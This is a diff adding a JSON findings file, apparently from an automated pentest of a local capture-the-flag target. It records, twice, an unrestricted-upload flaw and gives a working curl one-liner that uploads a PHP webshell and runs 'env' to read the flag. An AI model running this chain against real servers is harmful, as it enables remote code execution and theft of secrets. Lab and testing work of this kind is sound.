@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T16:31:01.747026+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "fdb972f6-034b-4c27-8bd0-38f8902ec0fb",
+      "timestamp": "2026-04-14T16:31:01.746901+00:00",
+      "title": "Unrestricted File Upload Leading to RCE - CTF Flag Found",
+      "severity": "critical",
+      "target": "http://172.17.0.1:60305",
+      "description": "The image upload page at index.php accepts any file type without validation. Uploading a PHP webshell and accessing it via /upload/ allows arbitrary command execution. Environment variables reveal the CTF flag.",
+      "evidence": "FLAG=flag{dc97f359-f228-492b-b344-038f3d712a73}",
+      "tool_used": "kali/curl",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "echo '<?php system(\"env\"); ?>' > /tmp/test.php && curl -s -X POST http://172.17.0.1:60305/index.php -F \"userfile=@/tmp/test.php\" -F \"submit=Upload Image\" && curl -s http://172.17.0.1:60305/upload/test.php",
+        "expected": "FLAG=flag{dc97f359-f228-492b-b344-038f3d712a73}"
+      }
+    },
+    {
+      "id": "6c166dde-43f1-4d55-9c09-7e07489efc69",
+      "timestamp": "2026-04-14T16:31:01.803572+00:00",
+      "title": "Unrestricted File Upload Leading to RCE - CTF Flag Found",
+      "severity": "critical",
+      "target": "http://172.17.0.1:60305",
+      "description": "The image upload page at index.php accepts any file type without validation. Uploading a PHP webshell and accessing it via /upload/ allows arbitrary command execution. Environment variables reveal the CTF flag.",
+      "evidence": "FLAG=flag{dc97f359-f228-492b-b344-038f3d712a73}",
+      "tool_used": "kali/curl",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "echo '<?php system(\"env\"); ?>' > /tmp/test.php && curl -s -X POST http://172.17.0.1:60305/index.php -F \"userfile=@/tmp/test.php\" -F \"submit=Upload Image\" && curl -s http://172.17.0.1:60305/upload/test.php",
+        "expected": "FLAG=flag{dc97f359-f228-492b-b344-038f3d712a73}"
+      }
+    }
+  ],
+  "diagrams": []
+}
